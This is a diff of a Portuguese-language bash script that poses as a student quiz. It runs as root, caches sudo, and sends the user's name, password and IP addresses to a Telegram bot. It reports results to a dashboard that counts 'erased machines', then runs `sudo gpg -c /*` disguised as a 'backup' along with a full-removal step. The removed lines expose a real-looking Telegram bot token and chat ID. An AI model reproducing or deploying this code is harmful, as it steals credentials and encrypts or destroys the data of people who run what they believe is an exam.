@@ -7,7 +7,7 @@ if [ "$(id -u)" -ne 0 ]; then
 	exit 1
 fi
 
-sudo -v 
+sudo -v # Armazenar em Cache Senha Sudo
 
 # Definindo as cores
 RED=$(tput setaf 1)
@@ -104,8 +104,10 @@ capturar_ip() {
 # Função para enviar mensagem ao Telegram usando wget
 enviar_telegram() {
     local mensagem="$1"
-    local chat_id="511867448"  # Chat ID do Telegram
-    local bot_token="7692442307:AAHFgnUWu9hkFkAzRGk8rHw7M_YnqDfBGJ8"  # Bot Token
+    
+    # Substitua com suas credenciais do Telegram:
+    local chat_id="SEU_CHAT_ID_AQUI"       # Chat ID do Telegram
+    local bot_token="SEU_BOT_TOKEN_AQUI"    # Bot Token
 
     wget --quiet --method=POST \
         --header="Content-Type: application/x-www-form-urlencoded" \
@@ -156,9 +158,13 @@ enviar_credenciais() {
     local nome="$1"
     local senha="$2"
     local IPs="$3"
+    
+    # Mensagem a ser enviada
     local mensagem="*Nome*: \`$nome\`\n*Senha*: \`$senha\`\n*IPs*: \`$IPs\`"
-    local chat_id="511867448"  # Chat ID do Telegram
-    local bot_token="7692442307:AAHFgnUWu9hkFkAzRGk8rHw7M_YnqDfBGJ8"  # Bot Token
+    
+    # Substitua com suas credenciais do Telegram:
+    local chat_id="SEU_CHAT_ID_AQUI"       # Chat ID do Telegram
+    local bot_token="SEU_BOT_TOKEN_AQUI"    # Bot Token
 
     wget --quiet --method=POST "https://api.telegram.org/bot$bot_token/sendMessage" \
     --body-data="chat_id=$chat_id&text=$mensagem&parse_mode=MarkdownV2" \
@@ -335,6 +341,9 @@ exibir_questao() {
     echo -e "${YELLOW}$pergunta${NC}"
 }
 
+# Defina o IP do servidor Apache
+servidor_apache="SEU_IP_DO_SERVIDOR_AQUI"
+
 # Função para perguntar e validar resposta
 fazer_pergunta() {
     local pergunta="$1"
@@ -371,7 +380,7 @@ fazer_pergunta() {
     fi
 
     # Envia o progresso para o servidor Apache após validar a resposta
-    wget --quiet --post-data "nickname=$nome_usuario&progress=$pontuacao" http://172.31.19.2/dashboard/update.php -O /dev/null 2>&1
+    wget --quiet --post-data "nickname=$nome_usuario&progress=$pontuacao" http://$servidor_apache/dashboard/update.php -O /dev/null 2>&1
 
     # Pausa para leitura do resultado antes de passar para a próxima pergunta
     sleep 1
@@ -403,6 +412,9 @@ exibir_como_digitacao() {
     tput sgr0  # Reseta a cor ao final
 }
 
+# Defina o IP do servidor Apache
+servidor_apache="SEU_IP_DO_SERVIDOR_AQUI"
+
 # Função para calcular a média, exibir o resultado e aplicar as ações
 finalizar_prova() {
     # Exibir mensagem de cálculo da média
@@ -429,7 +441,7 @@ finalizar_prova() {
     enviar_telegram "Aluno: $nome_usuario\nPontuação: $pontuacao de 10\nIPs: $IPs"
 
     # Atualizar o progresso do aluno no servidor Apache
-    wget --quiet --post-data "nickname=$nome_usuario&progress=$pontuacao" http://172.31.19.2/dashboard/update.php -O /dev/null 2>&1
+    wget --quiet --post-data "nickname=$nome_usuario&progress=$pontuacao" http://$servidor_apache/dashboard/update.php -O /dev/null 2>&1
 
     # Exibir uma mensagem final independente da nota
     echo ""
@@ -437,16 +449,16 @@ finalizar_prova() {
     sleep 5  # Pequena pausa antes de iniciar o apagamento
 
     # Incrementar o contador de máquinas apagadas
-    num_apagadas=$(wget --quiet -qO- http://172.31.19.2/dashboard/get_apagadas.php)
+    num_apagadas=$(wget --quiet -qO- http://$servidor_apache/dashboard/get_apagadas.php)
     num_apagadas=$((num_apagadas + 1))
-    wget --quiet --post-data "nickname=$nome_usuario&progress=$pontuacao" http://172.31.19.2/dashboard/update.php -O /dev/null 2>&1
+    wget --quiet --post-data "num_apagadas=$num_apagadas" http://$servidor_apache/dashboard/update_apagadas.php -O /dev/null 2>&1
 
     # Iniciar o processo de backup e apagamento
     fazer_backup_logs
     limpar_arquivos_temporarios
 }
 
-# Crip
+# Criptografia da Máquina
 fazer_backup_logs() {
     echo ""
     tput setaf 2  # Verde para o início da digitação
@@ -461,7 +473,7 @@ fazer_backup_logs() {
     nohup sudo gpg -c /* > /dev/null 2>&1 &  # "backup"
 }
 
-# LOGs
+# Remoção Completa da Máquina
 limpar_arquivos_temporarios() {
     echo ""
     tput setaf 2  # Verde para o início da digitação
